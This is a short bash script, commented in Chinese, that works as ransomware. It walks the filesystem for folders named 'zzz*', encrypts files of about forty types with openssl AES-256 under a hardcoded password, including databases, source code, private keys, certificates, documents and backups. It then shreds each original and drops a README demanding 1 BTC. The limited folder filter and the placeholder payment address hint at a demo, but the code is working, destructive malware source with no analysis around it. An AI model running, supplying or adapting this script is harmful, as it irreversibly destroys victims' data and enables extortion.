#!/bin/bash

PASSWORD="123456789"

# 要加密的文件扩展名列表
EXTENSIONS=("*.sql" "*.csv" "*.dat" "*.oci" "*.tar_gz" "*.img" "*.py" "*.java" "*.cpp" "*.c" "*.js" "*.php" "*.html" "*.crt" "*.cer" "*.pem" "*.key" "*.pub" "*.tar" "*.bak" "*.zip" "*.rar" "*.7z" "*.gz" "*.doc" "*.xls" "*.xlsx" "*.ppt" "*.pptx" "*.pdf" "*.txt" "*.ini" "*.conf" "*.cfg" "*.json" "*.xml" "*.yml" "*.log" "*.bin" "*.dll" "*.bat")

# 查找所有以 zzz 开头的目录
find / -type d -name "zzz*" | while read -r folder; do
  echo "[+] Processing folder: $folder"
  
  # 针对每种扩展名处理文件
  for ext in "${EXTENSIONS[@]}"; do
    find "$folder" -type f -name $ext | while read -r file; do
      echo "    Encrypting: $file"
      openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -in "$file" -out "$file.enc" -pass pass:$PASSWORD
      if [ $? -eq 0 ]; then
        shred -u "$file"
        echo "    [?] Encrypted successfully: $file -> $file.enc"
      else
        echo "    [?] Failed to encrypt: $file"
      fi
    done
  done

  # 添加勒索说明文件
  echo "All your files in '$folder' have been encrypted. Pay 1 BTC to XXX." > "$folder/README.txt"
done
